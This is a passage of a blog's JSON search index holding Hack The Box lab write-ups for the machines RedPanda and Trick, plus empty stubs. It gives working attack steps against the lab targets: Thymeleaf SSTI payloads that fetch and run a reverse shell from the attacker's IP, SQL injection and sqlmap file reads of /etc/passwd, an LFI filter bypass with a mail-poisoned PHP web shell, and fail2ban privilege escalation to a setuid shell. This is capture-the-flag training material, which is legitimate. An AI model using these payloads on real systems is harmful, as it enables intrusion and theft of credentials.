SF:e,\\x2029\\x20Aug\\x202023\\x2018:50:20\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\ SF:r\\n\u0026#34;)%r(RTSPRequest,24E,\u0026#34;HTTP/1\\.1\\x20400\\x20\\r\\nContent-Type:\\x20text/ SF:html;charset=utf-8\\r\\nContent-Language:\\x20en\\r\\nContent-Length:\\x20435 SF:\\r\\nDate:\\x20Tue,\\x2029\\x20Aug\\x202023\\x2018:50:20\\x20GMT\\r\\nConnection SF::\\x20close\\r\\n\\r\\n\u0026lt;!doctype\\x20html\u0026gt;\u0026lt;html\\x20lang=\\\u0026#34;en\\\u0026#34;\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;H SF:TTP\\x20Status\\x20400\\x20\\xe2\\x80\\x93\\x20Bad\\x20Request\u0026lt;/title\u0026gt;\u0026lt;style\\x2 SF:0type=\\\u0026#34;text/css\\\u0026#34;\u0026gt;body\\x20{font-family:Tahoma,Arial,sans-serif;}\\x20h1 SF:,\\x20h2,\\x20h3,\\x20b\\x20{color:white;background-color:#525D76;}\\x20h1\\x SF:20{font-size:22px;}\\x20h2\\x20{font-size:16px;}\\x20h3\\x20{font-size:14px SF:;}\\x20p\\x20{font-size:12px;}\\x20a\\x20{color:black;}\\x20\\.line\\x20{heigh SF:t:1px;background-color:#525D76;border:none;}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026lt;h1\u0026gt;HT SF:TP\\x20Status\\x20400\\x20\\xe2\\x80\\x93\\x20Bad\\x20Request\u0026lt;/h1\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html SF:\u0026gt;\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 30.35 seconds Web Server gobuster â””â”€$ gobuster dir -u http://10.10.11.170:8080 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.170:8080 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt [+] Timeout: 10s =============================================================== 2023/08/29 19:56:33 Starting gobuster in directory enumeration mode =============================================================== /search (Status: 405) [Size: 117] /stats (Status: 200) [Size: 987] /error (Status: 500) [Size: 86] Foothold/User Based from nmap results we know that it\u0026rsquo;s Spring applicaton If we try searching for anything, the server reflects our input Which might indicate a SSTI https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#spring-framework-java Basic SSTI payloads don\u0026rsquo;t work So I tried the payloads that are specific for Spring Boot -\u0026gt; Thymeleaf https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/ Like #{7*7} or *{7*7} and they work We could\u0026rsquo;ve also detected banned chars via fuzzing Because when I tried ${7*7} it returned error with banned characters wfuzz -u http://10.10.11.170:8080/search -d name=FUZZ -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt --ss banned Let\u0026rsquo;s test for RCE *{T(java.lang.Runtime).getRuntime().exec('ping -c 1 10.10.16.4')} And it works We can also try *{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())} Now we can get a reverse shell *{T(java.lang.Runtime).getRuntime().exec('curl 10.10.16.4/revshell -o /tmp/revshell')} *{T(java.lang.Runtime).getRuntime().exec('bash /tmp/revshell')} Root woodenk is in the logs group woodenk@redpanda:/tmp/hsperfdata_woodenk$ id uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk) /opt has cleanup.sh Maybe there is a cronjob #!/bin/bash /usr/bin/find /tmp -name \u0026#34;*.xml\u0026#34; -exec rm -rf {} \\; /usr/bin/find /var/tmp -name \u0026#34;*.xml\u0026#34; -exec rm -rf {} \\; /usr/bin/find /dev/shm -name \u0026#34;*.xml\u0026#34; -exec rm -rf {} \\; /usr/bin/find /home/woodenk -name \u0026#34;*.xml\u0026#34; -exec rm -rf {} \\; /usr/bin/find /tmp -name \u0026#34;*.jpg\u0026#34; -exec rm -rf {} \\; /usr/bin/find /var/tmp -name \u0026#34;*.jpg\u0026#34; -exec rm -rf {} \\; /usr/bin/find /dev/shm -name \u0026#34;*.jpg\u0026#34; -exec rm -rf {} \\; /usr/bin/find /home/woodenk -name \u0026#34;*.jpg\u0026#34; -exec rm -rf {} \\; pspy proves it We also have /root/run_credits.sh which spawns /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar Let\u0026rsquo;s analyze applications ","date":"August 28, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/redpanda/images/redpanda.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/redpanda/","summary":"RedPanda Enumeration nmap â””â”€$ nmap -p- -Pn 10.10.11.170 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-29 19:41 BST Nmap scan report for 10.10.11.170 (10.10.11.170) Host is up (0.14s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 8080/tcp open http-proxy â””â”€$ nmap -p22,8080 -sC -sV -Pn 10.10.11.170 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-29 19:50 BST Nmap scan report for 10.10.11.170 (10.10.11.170) Host is up (0.","tags":["HTB"],"title":"[HTB] Machine: RedPanda"},{"categories":null,"contents":"Shoppy Enumeration ","date":"August 28, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/shoppy/images/shoppy.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/shoppy/","summary":"Shoppy Enumeration ","tags":["HTB"],"title":"[HTB] Machine: Shoppy"},{"categories":null,"contents":"Squashed Enumeration ","date":"August 28, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/squashed/images/squashed.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/squashed/","summary":"Squashed Enumeration ","tags":["HTB"],"title":"[HTB] Machine: Squashed"},{"categories":null,"contents":"Support Enumeration ","date":"August 28, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/support/images/support.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/support/","summary":"Support Enumeration ","tags":["HTB"],"title":"[HTB] Machine: Support"},{"categories":null,"contents":"Trick Enumeration nmap â””â”€$ nmap -Pn -p- 10.10.11.166 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-29 10:59 BST Stats: 0:13:46 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 91.73% done; ETC: 11:14 (0:01:14 remaining) Nmap scan report for 10.10.11.166 (10.10.11.166) Host is up (0.17s latency). Not shown: 65531 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 25/tcp open smtp 53/tcp open domain 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 906.34 seconds â””â”€$ nmap -Pn -p22,25,53,80 -sC -sV 10.10.11.166 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-29 11:17 BST Nmap scan report for 10.10.11.166 (10.10.11.166) Host is up (0.22s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 61:ff:29:3b:36:bd:9d:ac:fbðŸ‡©ðŸ‡ª1f:56:88:4c:ae:2d (RSA) | 256 9eðŸ’¿f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA) |_ 256 72:93:f9:11:58ðŸ‡©ðŸ‡ª34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519) 25/tcp open smtp Postfix smtpd |_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING 53/tcp open domain ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux) | dns-nsid: |_ bind.version: 9.11.5-P4-5.1+deb10u7-Debian 80/tcp open http nginx 1.14.2 |_http-title: Coming Soon - Start Bootstrap Theme |_http-server-header: nginx/1.14.2 Service Info: Host: debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 49.25 seconds Web Server dns zone transfer Guessing trick.htb worked â””â”€$ dig axfr @10.10.11.166 trick.htb ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.18.16-1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; axfr @10.10.11.166 trick.htb ; (1 server found) ;; global options: +cmd trick.htb. 604800 IN SOA trick.htb. root.trick.htb. 5 604800 86400 2419200 604800 trick.htb. 604800 IN NS trick.htb. trick.htb. 604800 IN A 127.0.0.1 trick.htb. 604800 IN AAAA ::1 preprod-payroll.trick.htb. 604800 IN CNAME trick.htb. trick.htb. 604800 IN SOA trick.htb. root.trick.htb. 5 604800 86400 2419200 604800 ;; Query time: 224 msec ;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP) ;; WHEN: Tue Aug 29 16:07:42 BST 2023 ;; XFR size: 6 records (messages 1, bytes 231) vhosts â””â”€$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u \u0026#39;http://trick.htb/\u0026#39; -H \u0026#39;Host: FUZZ.trick.htb\u0026#39; -fs 5480 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : http://trick.htb/ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt :: Header : Host: FUZZ.trick.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 :: Filter : Response size: 5480 ________________________________________________ gobuster â””â”€$ gobuster dir -u http://trick.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://trick.htb [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt [+] Timeout: 10s =============================================================== 2023/08/29 16:11:30 Starting gobuster in directory enumeration mode =============================================================== /assets (Status: 301) [Size: 185] [--\u0026gt; http://trick.htb/assets/] /css (Status: 301) [Size: 185] [--\u0026gt; http://trick.htb/css/] /js (Status: 301) [Size: 185] [--\u0026gt; http://trick.htb/js/] Nothing on smtp â””â”€$ nmap -p 25 --script=smtp-enum-users 10.10.11.166 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-29 16:16 BST Nmap scan report for trick.htb (10.10.11.166) Host is up (0.19s latency). PORT STATE SERVICE 25/tcp open smtp | smtp-enum-users: |_ Method RCPT returned a unhandled status code. Nmap done: 1 IP address (1 host up) scanned in 12.67 seconds Foothold/User payroll.trick.htb â””â”€$ gobuster dir -u http://preprod-payroll.trick.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt,php --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://preprod-payroll.trick.htb/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/08/29 16:14:49 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 302) [Size: 9546] [--\u0026gt; login.php] /home.php (Status: 200) [Size: 486] /login.php (Status: 200) [Size: 5571] /header.php (Status: 200) [Size: 2548] /users.php (Status: 200) [Size: 2197] /assets (Status: 301) [Size: 185] [--\u0026gt; http://preprod-payroll.trick.htb/assets/] /ajax.php (Status: 200) [Size: 0] /database (Status: 301) [Size: 185] [--\u0026gt; http://preprod-payroll.trick.htb/database/] /readme.txt (Status: 200) [Size: 149] /navbar.php (Status: 200) [Size: 1382] /department.php (Status: 200) [Size: 4844] /topbar.php (Status: 200) [Size: 585] /position.php (Status: 200) [Size: 5549] /employee.php (Status: 200) [Size: 2717] Web page Looks like some login page Let\u0026rsquo;s try default SQLi payload ' or 1=1-- - works We\u0026rsquo;re in By the way, I later found out that it is a actual software https://www.sourcecodester.com/php/14475/payroll-management-system-using-phpmysql-source-code.html Googling for Recruitment Management System Payroll Management System php should be enough If we inspect users page and edit administrator, we can see hidden password in sources SuperGucciRainbowCake But the creds didn\u0026rsquo;t work anywhere So since we have sqli, let\u0026rsquo;s try sqlmap â””â”€$ sqlmap -r login.req --batch --level 5 --risk 3 ___ __H__ ___ ___[(]_____ ___ ___ {1.7.8#stable} |_ -| . [,] | .\u0026#39;| . | |___|_ [)]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user\u0026#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 16:56:44 /2023-08-29/ [16:56:44] [INFO] parsing HTTP request from \u0026#39;login.req\u0026#39; custom injection marker (\u0026#39;*\u0026#39;) found in POST body. Do you want to process it? [Y/n/q] Y [16:56:44] [INFO] testing connection to the target URL [16:56:45] [INFO] checking if the target is protected by some kind of WAF/IPS [16:56:45] [INFO] testing if the target URL content is stable [16:56:45] [INFO] target URL content is stable [16:56:45] [INFO] testing if (custom) POST parameter \u0026#39;#1*\u0026#39; is dynamic [16:56:46] [WARNING] (custom) POST parameter \u0026#39;#1*\u0026#39; does not appear to be dynamic [16:56:46] [WARNING] heuristic (basic) test shows that (custom) POST parameter \u0026#39;#1*\u0026#39; might not be injectable [16:56:46] [INFO] testing for SQL injection on (custom) POST parameter \u0026#39;#1*\u0026#39; [16:56:46] [INFO] testing \u0026#39;AND boolean-based blind - WHERE or HAVING clause\u0026#39; [16:57:11] [INFO] testing \u0026#39;OR boolean-based blind - WHERE or HAVING clause\u0026#39; [16:57:32] [INFO] testing \u0026#39;OR boolean-based blind - WHERE or HAVING clause (NOT)\u0026#39; [16:57:34] [INFO] (custom) POST parameter \u0026#39;#1*\u0026#39; appears to be \u0026#39;OR boolean-based blind - WHERE or HAVING clause (NOT)\u0026#39; injectable [16:57:38] [INFO] heuristic (extended) test shows that the back-end DBMS could be \u0026#39;MySQL\u0026#39; it looks like the back-end DBMS is \u0026#39;MySQL\u0026#39;. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y ... (custom) POST parameter \u0026#39;#1*\u0026#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N sqlmap identified the following injection point(s) with a total of 604 HTTP(s) requests: --- Parameter: #1* ((custom) POST) Type: boolean-based blind Title: OR boolean-based blind - WHERE or HAVING clause (NOT) Payload: username=\u0026#39; OR NOT 8378=8378-- xHqp\u0026amp;password= Type: error-based Title: MySQL \u0026gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR) Payload: username=\u0026#39; OR (SELECT 6966 FROM(SELECT COUNT(*),CONCAT(0x71766b6a71,(SELECT (ELT(6966=6966,1))),0x7170706271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- duBl\u0026amp;password= Type: time-based blind Title: MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: username=\u0026#39; AND (SELECT 3579 FROM (SELECT(SLEEP(5)))wnFL)-- IoKl\u0026amp;password= --- [16:59:24] [INFO] the back-end DBMS is MySQL web application technology: Nginx 1.14.2 back-end DBMS: MySQL \u0026gt;= 5.0 (MariaDB fork) Let\u0026rsquo;s dump dbs â””â”€$ sqlmap -r login.req --dump --dbs ___ __H__ ___ ___[(]_____ ___ ___ {1.7.8#stable} |_ -| . [\u0026#39;] | .\u0026#39;| . | |___|_ [,]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user\u0026#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 17:00:04 /2023-08-29/ [17:00:04] [INFO] parsing HTTP request from \u0026#39;login.req\u0026#39; custom injection marker (\u0026#39;*\u0026#39;) found in POST body. Do you want to process it? [Y/n/q] y [17:00:08] [INFO] resuming back-end DBMS \u0026#39;mysql\u0026#39; [17:00:08] [INFO] testing connection to the target URL sqlmap resumed the following injection point(s) from stored session: ... [17:01:20] [INFO] retrieved: \u0026#39;\u0026#39; [17:01:20] [INFO] retrieved: \u0026#39;0\u0026#39; [17:01:20] [INFO] retrieved: \u0026#39;1\u0026#39; [17:01:21] [INFO] retrieved: \u0026#39;SuperGucciRainbowCake\u0026#39; [17:01:21] [INFO] retrieved: \u0026#39;Enemigosss\u0026#39; Database: payroll_db Table: users [1 entry] +----+-----------+---------------+--------+---------+---------+-----------------------+------------+ | id | doctor_id | name | type | address | contact | password | username | +----+-----------+---------------+--------+---------+---------+-----------------------+------------+ | 1 | 0 | Administrator | 1 | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | SuperGucciRainbowCake | Enemigosss | +----+-----------+---------------+--------+---------+---------+-----------------------+------------+ [17:01:21] [INFO] table \u0026#39;payroll_db.users\u0026#39; dumped to CSV file \u0026#39;/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/dump/payroll_db/users.csv\u0026#39; [17:01:21] [INFO] fetched data logged to text files under \u0026#39;/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb\u0026#39; Nothing interesting We can try checking privileges â””â”€$ sqlmap -r login.req --privilege ___ __H__ ___ ___[.]_____ ___ ___ {1.7.8#stable} |_ -| . [\u0026#34;] | .\u0026#39;| . | |___|_ [,]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user\u0026#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 17:09:00 /2023-08-29/ [17:09:00] [INFO] parsing HTTP request from \u0026#39;login.req\u0026#39; custom injection marker (\u0026#39;*\u0026#39;) found in POST body. Do you want to process it? [Y/n/q] y [17:09:01] [INFO] resuming back-end DBMS \u0026#39;mysql\u0026#39; [17:09:01] [INFO] testing connection to the target URL sqlmap resumed the following injection point(s) from stored session: ... [17:09:02] [INFO] retrieved: \u0026#39;\u0026#39;remo\u0026#39;@\u0026#39;localhost\u0026#39;\u0026#39; [17:09:03] [INFO] retrieved: \u0026#39;FILE\u0026#39; database management system users privileges: [*] \u0026#39;remo\u0026#39;@\u0026#39;localhost\u0026#39; [1]: privilege: FILE We have FILE privileges, so we can read files Test on /etc/passwd and it works â””â”€$ sqlmap -r login.req --batch --file-read=/etc/passwd ___ __H__ ___ ___[,]_____ ___ ___ {1.7.8#stable} |_ -| . [,] | .\u0026#39;| . | |___|_ [.]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user\u0026#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 17:17:04 /2023-08-29/ [17:17:04] [INFO] parsing HTTP request from \u0026#39;login.req\u0026#39; custom injection marker (\u0026#39;*\u0026#39;) found in POST body. Do you want to process it? [Y/n/q] Y [17:17:04] [INFO] resuming back-end DBMS \u0026#39;mysql\u0026#39; [17:17:04] [INFO] testing connection to the target URL sqlmap resumed the following injection point(s) from stored session: ... 2F7362696E2F6E6F6C6F67696E0A68706C69703A783A3131353A373A48504C49502073797374656D20757365722C2C2C3A2F7661722F72756E2F68706C69703A2F62696E2F66616C73650A44656269616E2D67646D3A783A3131363A3132343A476E6F6D6520446973706C6179204D616E616765723A2F7661722F6C69622F67646D333A2F62696E2F66616C73650A73797374656D642D636F726564756D703A783A3939393A3939393A73797374656D6420436F72652044756D7065723A2F3A2F7573722F7362696E2F6E6F6C6F67696E0A6D7973716C3A783A3131373A3132353A4D7953514C205365727665722C2C2C3A2F6E6F6E6578697374656E743A2F62696E2F66616C73650A737368643A783A3131383A36353533343A3A2F72756E2F737368643A2F7573722F7362696E2F6E6F6C6F67696E0A706F73746669783A783A3131393A3132363A3A2F7661722F73706F6F6C2F706F73746669783A2F7573722F7362696E2F6E6F6C6F67696E0A62696E643A783A3132303A3132383A3A2F7661722F63616368652F62696E643A2F7573722F7362696E2F6E6F6C6F67696E0A6D69636861656C3A783A313030313A313030313A3A2F686F6D652F6D69636861656C3A2F62696E2F do you want confirmation that the remote file \u0026#39;/etc/passwd\u0026#39; has been successfully downloaded from the back-end DBMS file system? [Y/n] Y [17:17:28] [INFO] retrieved: \u0026#39;2351\u0026#39; [17:17:28] [INFO] the local file \u0026#39;/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd\u0026#39; and the remote file \u0026#39;/etc/passwd\u0026#39; have the same size (2351 B) We can check other possible vhosts sqlmap -r login.req --batch --file-read=/etc/nginx/sites-enabled/default We have another one preprod-marketing.trick.htb â””â”€$ cat /home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-enabled_default server { listen 80 default_server; listen [::]:80 default_server; server_name trick.htb; root /var/www/html; index index.html index.htm index.nginx-debian.html; server_name _; location / { try_files $uri $uri/ =404; } location ~ \\.php$ { include snippets/fastcgi-php.conf; fastcgi_pass unix:/run/php/php7.3-fpm.sock; } } server { listen 80; listen [::]:80; server_name preprod-marketing.trick.htb; root /var/www/market; index index.php; location / { try_files $uri $uri/ =404; } location ~ \\.php$ { include snippets/fastcgi-php.conf; fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock; } } server { listen 80; listen [::]:80; server_name preprod-payroll.trick.htb; root /var/www/payroll; index index.php; location / { try_files $uri $uri/ =404; } location ~ \\.php$ { include snippets/fastcgi-php.conf; fastcgi_pass unix:/run/php/php7.3-fpm.sock; } } http://preprod-marketing.trick.htb/ We have http://preprod-marketing.trick.htb/index.php?page= We can try basic lfi payload to see if it works But both absolute and relative path payloads doesn\u0026rsquo;t seem to work Trying http://preprod-marketing.trick.htb/index.php?page=php://filter/convert.base64-encode/resource=index.php doesn\u0026rsquo;t work either So let\u0026rsquo;s check index.php via sqlmap â””â”€$ cat /home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_var_www_market_index.php \u0026lt;?php $file = $_GET[\u0026#39;page\u0026#39;]; if(!isset($file) || ($file==\u0026#34;index.php\u0026#34;)) { include(\u0026#34;/var/www/market/home.html\u0026#34;); } else{ include(\u0026#34;/var/www/market/\u0026#34;.str_replace(\u0026#34;../\u0026#34;,\u0026#34;\u0026#34;,$file)); } ?\u0026gt; Okay, we can bypass it via ....//, since it will replace the ../ which will leave ../ The web server is ran by michael We can check if michael has ssh key and he has Poison log path We can also nginx logs So we can try log poisoning Have to be careful, if we make mistake we won\u0026rsquo;t be able to exploit it this way Which is what I did Now we have web shell and can get reverse shell SMTP path We can send email to michael via swaks and access it via lfi We know michael\u0026rsquo;s box should be located in /var/mail/michael Send mail: swaks --to michael --from pentest --header \u0026quot;Subject: Pentest\u0026quot; --body '\u0026lt;?php system($_REQUEST[\u0026quot;cmd\u0026quot;]); ?\u0026gt;' --server 10.10.11.166 And check http://preprod-marketing.trick.htb/index.php?page=....//....//....//var/mail/michael\u0026amp;cmd=id Root We have sudo rights michael@trick:~$ sudo -l Matching Defaults entries for michael on trick: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User michael may run the following commands on trick: (root) NOPASSWD: /etc/init.d/fail2ban restart groups Non-standard security group michael@trick:~$ id uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security) We have full control over /etc/fail2ban/action.d michael@trick:~$ find / -group security -ls 2\u0026gt;/dev/null 269281 4 drwxrwx--- 2 root security 4096 Aug 29 19:54 /etc/fail2ban/action.d Let\u0026rsquo;s understand fail2ban The purpose of Fail2ban is to monitor the logs of common services to spot patterns in authentication failures When fail2ban is configured to monitor the logs of a service, it looks at a filter that has been configured specific to that service. The filter is designed to identify authentication failures for that specific service through the use of complex regular expressions. When a log from any service, like a web server, matches the failregex in its filter, a predefined action is executed for that service. https://www.digitalocean.com/community/tutorials/how-fail2ban-works-to-protect-services-on-a-linux-server Now we can check the configs and try abusing it We have jail for sshd and iptables-multiport config for actions ... [DEFAULT] ... # Default banning action (e.g. iptables, iptables-new, # iptables-multiport, shorewall, etc) It is used to define # action_* variables. Can be overridden globally or per # section within jail.local file banaction = iptables-multiport banaction_allports = iptables-allports ... [sshd] # To use more aggressive sshd modes set filter parameter \u0026#34;mode\u0026#34; in jail.local: # normal (default), ddos, extra or aggressive (combines all). # See \u0026#34;tests/files/logs/sshd\u0026#34; or \u0026#34;filter.d/sshd.conf\u0026#34; for usage example and details. #mode = normal port = ssh logpath = %(sshd_log)s backend = %(sshd_backend)s bantime = 10s ... Since we can write to iptables-multiport.conf To be specific change actionban parameter, so that it executes command when banning specific ip We don\u0026rsquo;t have write permissions, but we can mv it and then copy it (since we have ownership of the folder), so that we become an owner of that file Command: cp /bin/bash /tmp/rooted; chmod 4777 /tmp/rooted https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/ michael@trick:/etc/fail2ban/action.d$ mv iptables-multiport.conf iptables-multiport.conf.bak michael@trick:/etc/fail2ban/action.d$ ls -lha iptables* -rw-r--r-- 1 root root 1.4K Aug 29 20:18 iptables-allports.conf -rw-r--r-- 1 root root 2.7K Aug 29 20:18 iptables-common.conf -rw-r--r-- 1 root root 1.4K Aug 29 20:18 iptables.conf -rw-r--r-- 1 root root 2.0K Aug 29 20:18 iptables-ipset-proto4.conf -rw-r--r-- 1 root root 2.2K Aug 29 20:18 iptables-ipset-proto6-allports.conf -rw-r--r-- 1 root root 2.2K Aug 29 20:18 iptables-ipset-proto6.conf -rw-r--r-- 1 root root 1.4K Aug 29 20:18 iptables-multiport.conf.bak -rw-r--r-- 1 root root 2.1K Aug 29 20:18 iptables-multiport-log.conf -rw-r--r-- 1 root root 1.5K Aug 29 20:18 iptables-new.conf -rw-r--r-- 1 root root 2.6K Aug 29 20:18 iptables-xt_recent-echo.conf michael@trick:/etc/fail2ban/action.d$ cp iptables-multiport.conf.bak iptables-multiport.conf michael@trick:/etc/fail2ban/action.d$ ls -lha iptables* -rw-r--r-- 1 root root 1.4K Aug 29 20:18 iptables-allports.conf -rw-r--r-- 1 root root 2.7K Aug 29 20:18 iptables-common.conf -rw-r--r-- 1 root root 1.4K Aug 29 20:18 iptables.conf -rw-r--r-- 1 root root 2.0K Aug 29 20:18 iptables-ipset-proto4.conf -rw-r--r-- 1 root root 2.2K Aug 29 20:18 iptables-ipset-proto6-allports.conf -rw-r--r-- 1 root root 2.2K Aug 29 20:18 iptables-ipset-proto6.conf -rw-r--r-- 1 michael michael 1.4K Aug 29 20:19 iptables-multiport.conf -rw-r--r-- 1 root root 1.4K Aug 29 20:18 iptables-multiport.conf.bak -rw-r--r-- 1 root root 2.1K Aug 29 20:18 iptables-multiport-log.conf -rw-r--r-- 1 root root 1.5K Aug 29 20:18 iptables-new.conf -rw-r--r-- 1 root root 2.6K Aug 29 20:18 iptables-xt_recent-echo.conf Now restart michael@trick:/etc/fail2ban/action.d$ sudo /etc/init.d/fail2ban restart sh: 0: getcwd() failed: No such file or directory [ ok ] Restarting fail2ban (via systemctl): fail2ban.service. Start crackmapexec crackmapexec ssh trick.htb -u pentest -p /usr/share/wordlists/rockyou.txt Check /tmp after a while and we are root ","date":"August 28, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/trick/images/trick.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/trick/","summary":"Trick Enumeration nmap â””â”€$ nmap -Pn -p- 10.10.11.166 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-29 10:59 BST Stats: 0:13:46 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 91.73% done; ETC: 11:14 (0:01:14 remaining) Nmap scan report for 10.10.11.166 (10.10.11.166) Host is up (0.17s latency). Not shown: 65531 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 25/tcp open smtp 53/tcp open domain 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 906.","tags":["HTB","smtp","smtp-user-enum","zone-transfer","vhosts","employee-management-system","sqli","sqli-bypass","cve-2022-28468","boolean-based-sqli","sqlmap","file-read","lfi","directory-traversal","mail-poisoning","log-poisoning","fail2ban"],"title":"[HTB] Machine: Trick"},{"categories":null,"contents":"TwoMillion Enumeration ","date":"August 28, 